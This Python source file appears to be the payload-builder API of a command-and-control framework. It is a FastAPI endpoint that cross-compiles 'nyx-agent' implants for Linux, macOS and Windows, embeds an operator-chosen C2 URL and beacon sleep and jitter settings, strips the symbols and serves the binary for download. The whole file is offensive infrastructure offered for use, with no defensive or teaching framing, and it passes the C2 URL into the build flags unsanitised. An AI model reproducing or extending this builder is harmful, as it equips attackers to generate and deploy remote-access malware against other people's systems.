import os, subprocess, tempfile, shutil
from fastapi import APIRouter, HTTPException, Depends
from fastapi.responses import FileResponse
from pydantic import BaseModel
from core.auth import get_current_operator

router = APIRouter(prefix="/api/builder", tags=["builder"])

AGENT_SRC = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../agent"))

PLATFORMS = {
    "linux-amd64":   {"GOOS": "linux",   "GOARCH": "amd64",  "ext": ""},
    "linux-arm64":   {"GOOS": "linux",   "GOARCH": "arm64",  "ext": ""},
    "darwin-amd64":  {"GOOS": "darwin",  "GOARCH": "amd64",  "ext": ""},
    "darwin-arm64":  {"GOOS": "darwin",  "GOARCH": "arm64",  "ext": ""},
    "windows-amd64": {"GOOS": "windows", "GOARCH": "amd64",  "ext": ".exe"},
}

class BuildRequest(BaseModel):
    c2_url: str
    platform: str
    sleep: int = 5
    jitter: int = 1

@router.get("/platforms")
def list_platforms(_: str = Depends(get_current_operator)):
    return list(PLATFORMS.keys())

@router.post("/build")
def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
    if req.platform not in PLATFORMS:
        raise HTTPException(400, f"Unknown platform. Choose from: {list(PLATFORMS.keys())}")

    p = PLATFORMS[req.platform]
    ext = p["ext"]
    out_name = f"nyx-agent-{req.platform}{ext}"

    tmp_dir = tempfile.mkdtemp()
    out_path = os.path.join(tmp_dir, out_name)

    env = os.environ.copy()
    env["GOOS"]    = p["GOOS"]
    env["GOARCH"]  = p["GOARCH"]
    env["CGO_ENABLED"] = "0"
    env["PATH"]    = env.get("PATH", "") + ":/opt/homebrew/bin:/usr/local/go/bin"

    ldflags = (
        f'-s -w '
        f'-X main.C2URL={req.c2_url} '
        f'-X main.DefaultSleep={req.sleep} '
        f'-X main.DefaultJitter={req.jitter}'
    )

    result = subprocess.run(
        ["go", "build", f"-ldflags={ldflags}", "-o", out_path, "."],
        cwd=AGENT_SRC,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
    )

    if result.returncode != 0:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise HTTPException(500, f"Build failed: {result.stderr}")

    return FileResponse(
        out_path,
        filename=out_name,
        media_type="application/octet-stream",
        background=None,
    )
